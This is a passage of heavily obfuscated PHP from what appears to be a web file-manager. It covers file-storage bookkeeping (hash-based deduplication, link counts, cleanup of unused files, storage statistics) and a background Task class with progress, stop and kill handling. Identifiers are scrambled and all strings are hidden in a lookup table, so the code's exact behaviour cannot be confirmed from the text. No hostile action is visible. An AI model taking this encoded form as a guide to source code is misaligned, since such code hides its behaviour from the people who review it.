substr($à­¿Ğ‰, 0, 5) : rand_string(5)); $¥à÷Š“± = $ú«˜•µå . $†äîı¥è . $µ‚ñèß; if ($é€ƒ…­ó) { $¥à÷Š“± = $¥à÷Š“± . $äÙ¼ò[10] . $é€ƒ…­ó; } } if (IO::isOsDriver($¥à÷Š“±) && !IO::isUploadServer($¥à÷Š“±)) { if (IO::exist($¥à÷Š“±)) { return $¥à÷Š“±; } $‘´¿Â = IO::setContent($¥à÷Š“±, $äÙ¼ò[12]); if (!$‘´¿Â) { show_json($äÙ¼ò[2011], !1); } } CacheLock::unlock($€„¬ÍÉş); break; case $äÙ¼ò[831]: break; default: break; } return $¥à÷Š“±; } public function addFileByRemote($ İ´–å¹, $ÌçÏñš, $ü—íòû = array()) { $ßÏË…ˆÕ =& $_SERVER[‹è™Ü¸Ñ]; if (!IO::exist($ İ´–å¹)) { return !1; } $Ç•á€µä = $ü—íòû[$ßÏË…ˆÕ[547]] ? $ü—íòû[$ßÏË…ˆÕ[547]] : $ßÏË…ˆÕ[12]; $üìºêôÌ = IO::hashMd5($ İ´–å¹, $Ç•á€µä); $ç»ú£ı¢ = KodIO::defaultDriver(); $ˆªÅòŞÁ = array($ßÏË…ˆÕ[617] => IO::size($ İ´–å¹), $ßÏË…ˆÕ[2012] => 1, $ßÏË…ˆÕ[494] => $ÌçÏñš, $ßÏË…ˆÕ[863] => $ç»ú£ı¢[$ßÏË…ˆÕ[475]], $ßÏË…ˆÕ[495] => $ İ´–å¹, $ßÏË…ˆÕ[2013] => $ü—íòû[$ßÏË…ˆÕ[672]] ? $ü—íòû[$ßÏË…ˆÕ[672]] : IO::hashSimple($ İ´–å¹), $ßÏË…ˆÕ[2014] => $üìºêôÌ ? $üìºêôÌ : $Ç•á€µä); if ($—€ƒô×Ì = $this->addFileCheckExist($ˆªÅòŞÁ[$ßÏË…ˆÕ[672]], $ˆªÅòŞÁ[$ßÏË…ˆÕ[547]], $ˆªÅòŞÁ[$ßÏË…ˆÕ[79]])) { return $—€ƒô×Ì; } return $this->addFileData($ˆªÅòŞÁ); } private function addFileData($¶€‡éÈÊ) { $›÷û‹€™ =& $_SERVER[‹è™Ü¸Ñ]; if (!$¶€‡éÈÊ) { return !1; } $¶€‡éÈÊ[$›÷û‹€™[79]] = intval($¶€‡éÈÊ[$›÷û‹€™[79]]); if (!$¶€‡éÈÊ[$›÷û‹€™[79]] && strlen($¶€‡éÈÊ[$›÷û‹€™[672]]) > 32) { $¶€‡éÈÊ[$›÷û‹€™[79]] = intval(substr($¶€‡éÈÊ[$›÷û‹€™[672]], 32)); } $‚æ»ê³ù = $this->add($¶€‡éÈÊ); return $this->find($‚æ»ê³ù); } public function addFile($­¿§Ùå, $Œ³Êì‡, $°óÁæ™ = false) { $ïÇáŞõƒ =& $_SERVER[‹è™Ü¸Ñ]; $ä†¾ ó’ = IO::hashSimple($­¿§Ùå); $ŒÒëí×¶ = IO::size($­¿§Ùå); $ÔÑàäŒÛ = $ŒÒëí×¶ <= 1024 * 1024 * 10 ? IO::hashMd5($­¿§Ùå) : $ïÇáŞõƒ[12]; $Ò«•Ù‚ = $ïÇáŞõƒ[2015] . $ä†¾ ó’; CacheLock::lock($Ò«•Ù‚); if ($ÔÑàäŒÛ && $ä†¾ ó’) { $›äÎìŠã = $this->addFileCheckExist($ä†¾ ó’, $ÔÑàäŒÛ, $ŒÒëí×¶); if ($›äÎìŠã) { CacheLock::unlock($Ò«•Ù‚); return $›äÎìŠã; } } $Ê­ºÍğ = $this->addFileMake($­¿§Ùå, $ŒÒëí×¶, $ä†¾ ó’, $ÔÑàäŒÛ, $Œ³Êì‡, $°óÁæ™); $¡Éµ¤ÁÜ = $this->addFileData($Ê­ºÍğ); CacheLock::unlock($Ò«•Ù‚); if (!$ÔÑàäŒÛ && $¡Éµ¤ÁÜ) { $this->fileMd5Check($¡Éµ¤ÁÜ); } return $¡Éµ¤ÁÜ; } public function fileMd5Check($øıÑé) { $ñĞšÌ¬Ò =& $_SERVER[‹è™Ü¸Ñ]; $ñ÷Ü = array($øıÑé[$ñĞšÌ¬Ò[541]], $øıÑé[$ñĞšÌ¬Ò[87]]); $ÊŸ¹­ˆ = $ñĞšÌ¬Ò[2016] . $øıÑé[$ñĞšÌ¬Ò[87]]; $¶Õñîá½ = $ñĞšÌ¬Ò[2017] . $øıÑé[$ñĞšÌ¬Ò[541]]; TaskQueue::add($ñĞšÌ¬Ò[2018], $ñ÷Ü, $ÊŸ¹­ˆ, $¶Õñîá½); } public function fileMd5Set($ÈÒ¡¥¹í, $ÒîÎª) { $˜æ•Ôğ =& $_SERVER[‹è™Ü¸Ñ]; $Âšß§¾¨ = $this->find($ÈÒ¡¥¹í); if (!$Âšß§¾¨ || $Âšß§¾¨[$˜æ•Ôğ[547]]) { return; } $ç»Ä“òª = IO::hashMd5($ÒîÎª); if (!$ç»Ä“òª) { return $˜æ•Ôğ[12]; } $this->where(array($˜æ•Ôğ[541] => $ÈÒ¡¥¹í))->save(array($˜æ•Ôğ[547] => $ç»Ä“òª)); } public function addFileMake($ú«Ø§, $¨€öÍ„Œ, $ºğ±¹øÇ, $‰ƒƒùé—, $›ç´Ó–Š, $¼ÍèåÒ’) { $Ø×“•¾ü =& $_SERVER[‹è™Ü¸Ñ]; $ãû€‹õí = $this->createFileName($›ç´Ó–Š, $ºğ±¹øÇ, $‰ƒƒùé—); $£¸âÂ = get_path_father($ãû€‹õí); $ºú÷ùä€ = get_path_this($ãû€‹õí); if ($¼ÍèåÒ’) { $”¸åˆşˆ = IO::move($ú«Ø§, $£¸âÂ, !1, $ºú÷ùä€); } else { $”¸åˆşˆ = IO::copy($ú«Ø§, $£¸âÂ, !1, $ºú÷ùä€); } if (!$”¸åˆşˆ) { return !1; } $õĞøÙºø = KodIO::defaultDriver(); $­·Î—ûª = array($Ø×“•¾ü[617] => $¨€öÍ„Œ, $Ø×“•¾ü[2012] => 1, $Ø×“•¾ü[494] => $›ç´Ó–Š, $Ø×“•¾ü[863] => $õĞøÙºø[$Ø×“•¾ü[475]], $Ø×“•¾ü[495] => $ãû€‹õí, $Ø×“•¾ü[2013] => $ºğ±¹øÇ, $Ø×“•¾ü[2014] => $‰ƒƒùé—); return $­·Î—ûª; } public function addFileCheckExist($ôû€¡½–, $Ô¾õÜ¬, $’‰ëÁ) { $ñÅò¸¡ =& $_SERVER[‹è™Ü¸Ñ]; $œ¸¤×˜ = $this->findByHash($ôû€¡½–, $Ô¾õÜ¬); if (!$œ¸¤×˜) { return !1; } $ô¹¶ûÀÚ = array($ñÅò¸¡[2012] => intval($œ¸¤×˜[$ñÅò¸¡[2019]]) + 1, $ñÅò¸¡[617] => $’‰ëÁ); $this->where(array($ñÅò¸¡[542] => $œ¸¤×˜[$ñÅò¸¡[541]]))->save($ô¹¶ûÀÚ); return $œ¸¤×˜; } public function remove($·Ü•‘®…) { $this->linkCountChange($·Ü•‘®…, !1); $this->clearEmpty(); return !0; } public function linkAdd($Îã‹†…) { $this->linkCountChange($Îã‹†…, !0); } public function linkCountChange($¾İ÷à‹, $©¶–ìùË) { $îè¶Úı =& $_SERVER[‹è™Ü¸Ñ]; if (!$¾İ÷à‹) { return; } if (!is_array($¾İ÷à‹)) { $¾İ÷à‹ = array($¾İ÷à‹); } $×”“Ä« = array(); foreach ($¾İ÷à‹ as $ò™Îë’…) { $çóè›ª = $ò™Îë’… . $îè¶Úı[12]; if (!$×”“Ä«[$çóè›ª]) { $×”“Ä«[$çóè›ª] = 0; } $×”“Ä«[$çóè›ª]++; } $î¬Ğ“ä = array(); foreach ($×”“Ä« as $ò™Îë’… => $£ó»“ªÙ) { $çóè›ª = $£ó»“ªÙ . $îè¶Úı[12]; if (!$î¬Ğ“ä[$çóè›ª]) { $î¬Ğ“ä[$çóè›ª] = array(); } $î¬Ğ“ä[$çóè›ª][] = $ò™Îë’…; } foreach ($î¬Ğ“ä as $£ó»“ªÙ => $šÌñƒø) { if (!$šÌñƒø) { continue; } $£ó»“ªÙ = $©¶–ìùË ? $£ó»“ªÙ : -intval($£ó»“ªÙ); $áâµ±©‚ = array($îè¶Úı[541] => array($îè¶Úı[7], $šÌñƒø)); if ($£ó»“ªÙ < 0) { $áâµ±©‚[$îè¶Úı[2019]] = array($îè¶Úı[1073], abs($£ó»“ªÙ)); } $this->where($áâµ±©‚)->setAdd($îè¶Úı[2019], $£ó»“ªÙ); } } public function findByHash($Ê³ğöË¦, $ñÕØ˜êˆ = false) { $»½ÆİÓ =& $_SERVER[‹è™Ü¸Ñ]; if (!$Ê³ğöË¦ && !$ñÕØ˜êˆ) { return !1; } $†õáºƒú = array($»½ÆİÓ[2013] => $Ê³ğöË¦); if ($ñÕØ˜êˆ) { $†õáºƒú = array($»½ÆİÓ[2014] => $ñÕØ˜êˆ); } return $this->order($»½ÆİÓ[2020])->where($†õáºƒú)->find(); } public function clearEmpty($ˆ×ÆÅ¹ = 0) { $¿¨‹™³ =& $_SERVER[‹è™Ü¸Ñ]; $ÜºûôÁú = time() - 3600 * 24 * $ˆ×ÆÅ¹; $÷ùŞÚğ­ = $¿¨‹™³[2021] . $ÜºûôÁú; $ŒÈìÌÈ¾ = $this->where($÷ùŞÚğ­)->select(); if (!$ŒÈìÌÈ¾) { return; } $½¤·îã = new Task($¿¨‹™³[2022], $¿¨‹™³[12], count($ŒÈìÌÈ¾)); foreach ($ŒÈìÌÈ¾ as $ÏÙ×ä…„) { $½¤·îã->update(1); $this->resetFile($ÏÙ×ä…„); } $½¤·îã->end(); } public function resetFile($ ÎŒ°Ûª) { $ç—üº¶ =& $_SERVER[‹è™Ü¸Ñ]; $Á˜Éä³¾ = array($ç—üº¶[542] => $ ÎŒ°Ûª[$ç—üº¶[541]]); $¹œÊä—“ = Model($ç—üº¶[1398])->where($Á˜Éä³¾)->count(); $‡ÄÉÂŠ— = Model($ç—üº¶[2023])->where($Á˜Éä³¾)->count(); $ø¸ÀÑû = intval($¹œÊä—“) + intval($‡ÄÉÂŠ—); if ($ø¸ÀÑû == 0) { IO::remove($ ÎŒ°Ûª[$ç—üº¶[87]]); Model($ç—üº¶[2024])->delete($ ÎŒ°Ûª[$ç—üº¶[541]]); $this->where($Á˜Éä³¾)->delete(); $this->metaSet($ ÎŒ°Ûª[$ç—üº¶[541]], null, null); write_log(ACTION . $ç—üº¶[2025] . KodUser::id() . $ç—üº¶[2026] . $ ÎŒ°Ûª[$ç—üº¶[541]] . $ç—üº¶[2027] . $ ÎŒ°Ûª[$ç—üº¶[79]] . $ç—üº¶[201] . $ ÎŒ°Ûª[$ç—üº¶[87]], $ç—üº¶[2028]); return; } if ($ ÎŒ°Ûª[$ç—üº¶[2019]] != $ø¸ÀÑû) { $this->where($Á˜Éä³¾)->save(array($ç—üº¶[2012] => $ø¸ÀÑû)); } } public function storageInfo($¤¡ÚîŸ = false) { $³ğ™·… =& $_SERVER[‹è™Ü¸Ñ]; $¾É×¿¼˜ = $this->count() + 0.0; $œõĞÉ¶Š = 0; $Ì°âÔ£Â = 1; $¨¶ûŠÃ© = 0; $‘íúÅê = 5000; for ($ÙæÅÙÉ‰ = 0; $ÙæÅÙÉ‰ < $¾É×¿¼˜; $ÙæÅÙÉ‰ = $ÙæÅÙÉ‰ + $‘íúÅê) { $ÖÏËª‹Ğ = $this->limit($ÙæÅÙÉ‰, $ÙæÅÙÉ‰ + $‘íúÅê)->select(); foreach ($ÖÏËª‹Ğ as $’óÒä²) { $Ì°âÔ£Â += $’óÒä²[$³ğ™·…[79]] * $’óÒä²[$³ğ™·…[2019]]; $œõĞÉ¶Š += $’óÒä²[$³ğ™·…[79]] * ($’óÒä²[$³ğ™·…[2019]] - 1); $¨¶ûŠÃ© += $’óÒä²[$³ğ™·…[2019]]; } } $ÃÂ¥µ™ = array($³ğ™·…[2029] => $Ì°âÔ£Â, $³ğ™·…[2030] => $œõĞÉ¶Š, $³ğ™·…[2031] => $œõĞÉ¶Š / $Ì°âÔ£Â, $³ğ™·…[83] => $¾É×¿¼˜, $³ğ™·…[2032] => $¨¶ûŠÃ©); return $ÃÂ¥µ™; } } goto C‰å—Œ–¼ã; E•è˜ŒÉÛî: class Task { const STATYS_STOP = "\x73\x74\x6f\x70"; const STATYS_RUNNING = "\162\165\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\x6b\x69\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($Ü¹ÚàĞõ, $…Ëø€Œ£ = '', $ù¶Ãë¹¾ = 0, $òİâæ´® = '') { $Œë¿—•Ş =& $_SERVER[‹è™Ü¸Ñ]; if (self::get($Ü¹ÚàĞõ)) { return; } $this->task = array($Œë¿—•Ş[475] => $Ü¹ÚàĞõ, $Œë¿—•Ş[1752] => USER_ID, $Œë¿—•Ş[1639] => $òİâæ´®, $Œë¿—•Ş[526] => $Œë¿—•Ş[12], $Œë¿—•Ş[33] => $…Ëø€Œ£, $Œë¿—•Ş[1123] => $Œë¿—•Ş[12], $Œë¿—•Ş[1121] => $ù¶Ãë¹¾, $Œë¿—•Ş[1753] => 0, $Œë¿—•Ş[1754] => 0, $Œë¿—•Ş[1755] => 0, $Œë¿—•Ş[1756] => timeFloat(), $Œë¿—•Ş[1757] => 0, $Œë¿—•Ş[1758] => 0, $Œë¿—•Ş[1759] => 0, $Œë¿—•Ş[1760] => 0, $Œë¿—•Ş[805] => $Œë¿—•Ş[1702]); $GLOBALS[$Œë¿—•Ş[1761]] = 1; Hook::bind($Œë¿—•Ş[1706], array($this, $Œë¿—•Ş[1762])); Hook::bind($Œë¿—•Ş[1763], array($this, $Œë¿—•Ş[1764])); $this->startAfter(); Hook::trigger($Œë¿—•Ş[1765], $this->task); $this->task[$Œë¿—•Ş[1758]] = timeFloat(); } public function end($¤À¬’Ùİ = '') { $å¿ÑğÜê =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$å¿ÑğÜê[1758]]) { self::valueSet($this->task[$å¿ÑğÜê[475]], !1); } $this->isEnd = !0; if ($¤À¬’Ùİ) { $this->task[$å¿ÑğÜê[526]] = $¤À¬’Ùİ; } self::log($å¿ÑğÜê[1766] . $this->task[$å¿ÑğÜê[475]] . $å¿ÑğÜê[1767] . sprintf($å¿ÑğÜê[905], timeFloat() - $this->task[$å¿ÑğÜê[1756]]) . $å¿ÑğÜê[1768]); Hook::unbind($å¿ÑğÜê[1706], array($this, $å¿ÑğÜê[1762])); Hook::unbind($å¿ÑğÜê[1763], array($this, $å¿ÑğÜê[1764])); $this->endAfter(); $ğÌèüÍ = $this->task; $this->task = !1; Hook::trigger($å¿ÑğÜê[1769], $ğÌèüÍ); } public function update($ùÕ‚öÖı = 0, $èˆéë× = false) { $ÀŒŒÍ² =& $_SERVER[‹è™Ü¸Ñ]; $±™ƒ‰ú‚ =& $this->task; if (!$±™ƒ‰ú‚) { return; } $±™ƒ‰ú‚[$ÀŒŒÍ²[1753]] += $ùÕ‚öÖı; $±™ƒ‰ú‚[$ÀŒŒÍ²[1757]] = timeFloat(); if ($±™ƒ‰ú‚[$ÀŒŒÍ²[1121]]) { if ($±™ƒ‰ú‚[$ÀŒŒÍ²[1121]] < $±™ƒ‰ú‚[$ÀŒŒÍ²[1753]]) { $±™ƒ‰ú‚[$ÀŒŒÍ²[1121]] = $±™ƒ‰ú‚[$ÀŒŒÍ²[1753]]; } $ìËÊù•¡ = timeFloat() - $±™ƒ‰ú‚[$ÀŒŒÍ²[1756]] - $±™ƒ‰ú‚[$ÀŒŒÍ²[1759]]; if ($ìËÊù•¡ <= 0) { $ìËÊù•¡ = 0.001; } $±™ƒ‰ú‚[$ÀŒŒÍ²[1754]] = $±™ƒ‰ú‚[$ÀŒŒÍ²[1753]] / $±™ƒ‰ú‚[$ÀŒŒÍ²[1121]]; $±™ƒ‰ú‚[$ÀŒŒÍ²[1755]] = $±™ƒ‰ú‚[$ÀŒŒÍ²[1753]] / $ìËÊù•¡; if ($±™ƒ‰ú‚[$ÀŒŒÍ²[1754]] > 0) { $±™ƒ‰ú‚[$ÀŒŒÍ²[1760]] = $ìËÊù•¡ * (1 - $±™ƒ‰ú‚[$ÀŒŒÍ²[1754]]) / $±™ƒ‰ú‚[$ÀŒŒÍ²[1754]]; } $±™ƒ‰ú‚[$ÀŒŒÍ²[1760]] = $±™ƒ‰ú‚[$ÀŒŒÍ²[1760]] <= 0 ? 0 : $±™ƒ‰ú‚[$ÀŒŒÍ²[1760]]; } $this->updateAfter(); $´É‹¨²Õ = 0.2; if (timeFloat() - $±™ƒ‰ú‚[$ÀŒŒÍ²[1758]] < $´É‹¨²Õ && !$èˆéë×) { return; } $²ììÓğğ = self::get($±™ƒ‰ú‚[$ÀŒŒÍ²[475]]); $ëåÚ™Çœ = $²ììÓğğ[$ÀŒŒÍ²[805]]; if ($ëåÚ™Çœ == self::STATYS_KILL) { $Š„È’Ú = array($ÀŒŒÍ²[1770] => LNG($ÀŒŒÍ²[1771]), $ÀŒŒÍ²[1277] => !1); Cache::set($ÀŒŒÍ²[1772] . $this->task[$ÀŒŒÍ²[475]], $Š„È’Ú, 30); $this->onKill(); $this->end(); die; } else { if ($ëåÚ™Çœ == self::STATYS_STOP) { $¯Æçöœú = 2; $²ììÓğğ[$ÀŒŒÍ²[1759]] += $¯Æçöœú; self::valueSet($±™ƒ‰ú‚[$ÀŒŒÍ²[475]], $²ììÓğğ); sleep($¯Æçöœú); $this->update(); return; } } $±™ƒ‰ú‚[$ÀŒŒÍ²[805]] = $ëåÚ™Çœ ? $ëåÚ™Çœ : $±™ƒ‰ú‚[$ÀŒŒÍ²[805]]; $±™ƒ‰ú‚[$ÀŒŒÍ²[1759]] = $²ììÓğğ[$ÀŒŒÍ²[1759]] ? $²ììÓğğ[$ÀŒŒÍ²[1759]] : 0; $±™ƒ‰ú‚[$ÀŒŒÍ²[1758]] = timeFloat(); Hook::trigger($ÀŒŒÍ²[1773], $±™ƒ‰ú‚); self::valueSet($±™ƒ‰ú‚[$ÀŒŒÍ²[475]], $±™ƒ‰ú‚); } public function onKillSet($ßµ‡äõ±, $¢Ò¬”àÉ = array()) { $this->onKillCall = array($ßµ‡äõ±, $¢Ò¬”àÉ); } public function onKill() { $©»µÓ‚ú =& $_SERVER[‹è™Ü¸Ñ]; self::log($©»µÓ‚ú[1766] . $this->task[$©»µÓ‚ú[475]] . $©»µÓ‚ú[1774]); Hook::trigger($©»µÓ‚ú[1775], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($âµÌóà°) { $Í²Ü†´õ =& $_SERVER[‹è™Ü¸Ñ]; Cache::set($Í²Ü†´õ[1772] . $this->task[$Í²Ü†´õ[475]], $âµÌóà°, 60); return $âµÌóà°; } public static function get($š½äúıÅ) { $ÈğÆğÒ =& $_SERVER[‹è™Ü¸Ñ]; $¨¡ü¡Ç’ = self::valueGet($š½äúıÅ); if (is_array($¨¡ü¡Ç’) && $¨¡ü¡Ç’[$ÈğÆğÒ[1776]]) { $’ïÊ = ActionApply($¨¡ü¡Ç’[$ÈğÆğÒ[1776]], array($¨¡ü¡Ç’)); $¨¡ü¡Ç’ = is_array($’ïÊ) ? $’ïÊ : $¨¡ü¡Ç’; } return $¨¡ü¡Ç’; } public static function listData() { $øÂé§íò = self::valueGet(); return array_sort_by($øÂé§íò, $_SERVER[‹è™Ü¸Ñ][1756], !0); } public static function kill($Ã ’¨´ò) { return self::changeStatus($Ã ’¨´ò, self::STATYS_KILL); } public static function stop($ƒÓÖº¼) { return self::changeStatus($ƒÓÖº¼, self::STATYS_STOP); } public static function restart($§‹ïÄóë) { return self::changeStatus($§‹ïÄóë, self::STATYS_RUNNING); } public static function killAll() { $ì•òÎÔı =& $_SERVER[‹è™Ü¸Ñ]; $ÚĞ»äøÇ = self::listData(); foreach ($ÚĞ»äøÇ as $ùÊ£Ùí…) { self::kill($ùÊ£Ùí…[$ì•òÎÔı[475]]); } sleep(2); foreach ($ÚĞ»äøÇ as $ùÊ£Ùí…) { self::valueSet($ùÊ£Ùí…[$ì•òÎÔı[475]], !1); } } private static function changeStatus($ß°ÉŒ‹ˆ, $­¯¼úş‡) { $Ü™Ï‹Ú¨ =& $_SERVER[‹è™Ü¸Ñ]; $€ÙÜ¶“Ã = self::valueGet($ß°ÉŒ‹ˆ); if (!$€ÙÜ¶“Ã) { return !1; } $€ÙÜ¶“Ã[$Ü™Ï‹Ú¨[805]] = $­¯¼úş‡; self::valueSet($ß°ÉŒ‹ˆ, $€ÙÜ¶“Ã); self::log($Ü™Ï‹Ú¨[1777] . $€ÙÜ¶“Ã[$Ü™Ï‹Ú¨[475]] . $Ü™Ï‹Ú¨[1778] . $­¯¼úş‡); return !0; } public static function valueGet($Êõ³üø÷ = false) { $ÉÒèêÕ =& $_SERVER[‹è™Ü¸Ñ]; if ($Êõ³üø÷) { $×ôÙ ÜĞ = Model($ÉÒèêÕ[520])->where(array($ÉÒèêÕ[97] => $Êõ³üø÷, $ÉÒèêÕ[33] => $ÉÒèêÕ[1130]))->find(); return $×ôÙ ÜĞ ? json_decode($×ôÙ ÜĞ[$ÉÒèêÕ[450]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($£¹Ê‡Ò  = false) { $¢£äÄÎÒ =& $_SERVER[‹è™Ü¸Ñ]; $¶À“çüã = array($¢£äÄÎÒ[33] => $¢£äÄÎÒ[1130]); if ($£¹Ê‡Ò ) { $¶À“çüã[$¢£äÄÎÒ[1752]] = $£¹Ê‡Ò ; } $Ü©Ö¨—Î = Model($¢£äÄÎÒ[520])->where($¶À“çüã)->select(); $Ü©Ö¨—Î = $Ü©Ö¨—Î ? $Ü©Ö¨—Î : array(); foreach ($Ü©Ö¨—Î as $™ô¬ñ¦ø => $¥Å£ŸÉ) { $Ü©Ö¨—Î[$™ô¬ñ¦ø] = json_decode($¥Å£ŸÉ[$¢£äÄÎÒ[450]], !0); } return $Ü©Ö¨—Î; } public static function valueSet($²ÒÌ‡“â, $ºÚæ«Ó‰) { $¬©ÕÈü =& $_SERVER[‹è™Ü¸Ñ]; if (!$ºÚæ«Ó‰) { return Model($¬©ÕÈü[520])->where(array($¬©ÕÈü[97] => $²ÒÌ‡“â, $¬©ÕÈü[33] => $¬©ÕÈü[1130]))->delete(); } $‰–—‚« = json_encode($ºÚæ«Ó‰); if (!$‰–—‚«) { ob_start(); var_dump($ºÚæ«Ó‰); $Å¦»¼» = ob_get_clean(); self::log($¬©ÕÈü[1779] . json_encode_force($Å¦»¼»)); } if (!$²ÒÌ‡“â || !$ºÚæ«Ó‰[$¬©ÕÈü[475]]) { return !1; } $ÆÚîŠ›ë = array($¬©ÕÈü[33] => $¬©ÕÈü[1130], $¬©ÕÈü[1752] => USER_ID, $¬©ÕÈü[97] => $²ÒÌ‡“â, $¬©ÕÈü[450] => $‰–—‚«); $Á±îŞú– = $¬©ÕÈü[1780]; CacheLock::lock($Á±îŞú–); Model($¬©ÕÈü[520])->add($ÆÚîŠ›ë, array(), !0); CacheLock::unlock($Á±îŞú–); } public static function log($Ô½¶ø³·) { if (!GLOBAL_DEBUG) { return; } write_log($Ô½¶ø³·, $_SERVER[‹è™Ü¸Ñ][1781]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ã¾Œ»íé =& $_SERVER[‹è™Ü¸Ñ]; $œ°šá€” =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ã¾Œ»íé[1782], array($this, $ã¾Œ»íé[1783])); Hook::bind($ã¾Œ»íé[1288], array($this, $ã¾Œ»íé[1784])); Hook::bind($ã¾Œ»íé[1785], array($this, $ã¾Œ»íé[1786])); Hook::bind($ã¾Œ»íé[668], array($this, $ã¾Œ»íé[1787])); Hook::bind($ã¾Œ»íé[669], array($this, $ã¾Œ»íé[1788])); Hook::bind($ã¾Œ»íé[675], array($this, $ã¾Œ»íé[1789])); Hook::bind($ã¾Œ»íé[676], array($this, $ã¾Œ»íé[1790])); Hook::bind($ã¾Œ»íé[671], array($this, $ã¾Œ»íé[1791])); Hook::bind($ã¾Œ»íé[673], array($this, $ã¾Œ»íé[1792])); Hook::bind($ã¾Œ»íé[637], array($this, $ã¾Œ»íé[1793])); Hook::bind($ã¾Œ»íé[634], array($this, $ã¾Œ»íé[1793])); Hook::bind($ã¾Œ»íé[639], array($this, $ã¾Œ»íé[1793])); Hook::bind($ã¾Œ»íé[641], array($this, $ã¾Œ»íé[1793])); Hook::bind($ã¾Œ»íé[643], array($this, $ã¾Œ»íé[1793])); Hook::bind($ã¾Œ»íé[1794], array($this, $ã¾Œ»íé[1795])); Hook::bind($ã¾Œ»íé[659], array($this, $ã¾Œ»íé[1796])); $this->sourceModelCopyFlag = !1; Hook::bind($ã¾Œ»íé[1797], array($this, $ã¾Œ»íé[1798])); Hook::bind($ã¾Œ»íé[1799], array($this, $ã¾Œ»íé[1800])); Hook::bind($ã¾Œ»íé[1801], array($this, $ã¾Œ»íé[1802])); $œ°šá€”[$ã¾Œ»íé[1803]] = LNG($ã¾Œ»íé[1804]); $œ°šá€”[$ã¾Œ»íé[1805]] = 0; $œ°šá€”[$ã¾Œ»íé[1806]] = 0; $œ°šá€”[$ã¾Œ»íé[1123]] = $ã¾Œ»íé[12]; $œ°šá€”[$ã¾Œ»íé[1807]] = $ã¾Œ»íé[12]; $œ°šá€”[$ã¾Œ»íé[1808]] = 0; $œ°šá€”[$ã¾Œ»íé[1809]] = 0; $œ°šá€”[$ã¾Œ»íé[1810]] = 0; if (!$œ°šá€”[$ã¾Œ»íé[1639]]) { $œ°šá€”[$ã¾Œ»íé[1639]] = LNG($ã¾Œ»íé[1811]); } } protected function endAfter() { $Úø½ÍñÈ =& $_SERVER[‹è™Ü¸Ñ]; Hook::unbind($Úø½ÍñÈ[1782], array($this, $Úø½ÍñÈ[1783])); Hook::unbind($Úø½ÍñÈ[1288], array($this, $Úø½ÍñÈ[1784])); Hook::unbind($Úø½ÍñÈ[1785], array($this, $Úø½ÍñÈ[1786])); Hook::unbind($Úø½ÍñÈ[668], array($this, $Úø½ÍñÈ[1787])); Hook::unbind($Úø½ÍñÈ[669], array($this, $Úø½ÍñÈ[1788])); Hook::unbind($Úø½ÍñÈ[675], array($this, $Úø½ÍñÈ[1789])); Hook::unbind($Úø½ÍñÈ[676], array($this, $Úø½ÍñÈ[1790])); Hook::unbind($Úø½ÍñÈ[671], array($this, $Úø½ÍñÈ[1791])); Hook::unbind($Úø½ÍñÈ[673], array($this, $Úø½ÍñÈ[1792])); Hook::unbind($Úø½ÍñÈ[637], array($this, $Úø½ÍñÈ[1793])); Hook::unbind($Úø½ÍñÈ[634], array($this, $Úø½ÍñÈ[1793])); Hook::unbind($Úø½ÍñÈ[639], array($this, $Úø½ÍñÈ[1793])); Hook::unbind($Úø½ÍñÈ[641], array($this, $Úø½ÍñÈ[1793])); Hook::unbind($Úø½ÍñÈ[643], array($this, $Úø½ÍñÈ[1793])); Hook::unbind($Úø½ÍñÈ[1794], array($this, $Úø½ÍñÈ[1795])); Hook::unbind($Úø½ÍñÈ[659], array($this, $Úø½ÍñÈ[1796])); Hook::unbind($Úø½ÍñÈ[1797], array($this, $Úø½ÍñÈ[1798])); Hook::unbind($Úø½ÍñÈ[1799], array($this, $Úø½ÍñÈ[1800])); Hook::unbind($Úø½ÍñÈ[1801], array($this, $Úø½ÍñÈ[1802])); } public function copyMoveStart($Â¿Í‘Îİ, $çÊ‹§º, $à¡†şË¬, $¼©Í“¹) { $³Ú’£ÑØ =& $_SERVER[‹è™Ü¸Ñ]; self::log($³Ú’£ÑØ[1812] . $çÊ‹§º . $³Ú’£ÑØ[73] . $¼©Í“¹); $ô ëØ€Ñ = rtrim(TEMP_FILES, $³Ú’£ÑØ[8]); if (substr($çÊ‹§º, 0, strlen($ô ëØ€Ñ)) == $ô ëØ€Ñ) { return; } if (substr($¼©Í“¹, 0, strlen($ô ëØ€Ñ)) == $ô ëØ€Ñ) { return; } $áçƒ®«ì =& $this->task; $áçƒ®«ì[$³Ú’£ÑØ[1813]] = KodIO::transferType($Â¿Í‘Îİ, $à¡†şË¬); $this->update(); } public function updateAfter() { $¼Ø´šóÛ =& $_SERVER[‹è™Ü¸Ñ]; $ïÂ•¢ì€ =& $this->task; if (!$ïÂ•¢ì€[$¼Ø´šóÛ[818]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ïÂ•¢ì€[$¼Ø´šóÛ[1813]] == $¼Ø´šóÛ[1381]) { return; } self::updateTask($ïÂ•¢ì€); } private static function updateTask(&$”Õ³òŞÕ) { $£ÏÚòôÃ =& $_SERVER[‹è™Ü¸Ñ]; if ($”Õ³òŞÕ[$£ÏÚòôÃ[1813]] == $£ÏÚòôÃ[1259] || $”Õ³òŞÕ[$£ÏÚòôÃ[1813]] == $£ÏÚòôÃ[110]) { if ($”Õ³òŞÕ[$£ÏÚòôÃ[1807]]) { $”Õ³òŞÕ[$£ÏÚòôÃ[1810]] = $”Õ³òŞÕ[$£ÏÚòôÃ[1809]] + $”Õ³òŞÕ[$£ÏÚòôÃ[1806]]; } } else { if ($”Õ³òŞÕ[$£ÏÚòôÃ[1813]] == $£ÏÚòôÃ[1382]) { if ($”Õ³òŞÕ[$£ÏÚòôÃ[1807]] == $£ÏÚòôÃ[1259]) { $”Õ³òŞÕ[$£ÏÚòôÃ[1810]] = $”Õ³òŞÕ[$£ÏÚòôÃ[1809]] + $”Õ³òŞÕ[$£ÏÚòôÃ[1806]] * 0.5; } else { if ($”Õ³òŞÕ[$£ÏÚòôÃ[1807]] == 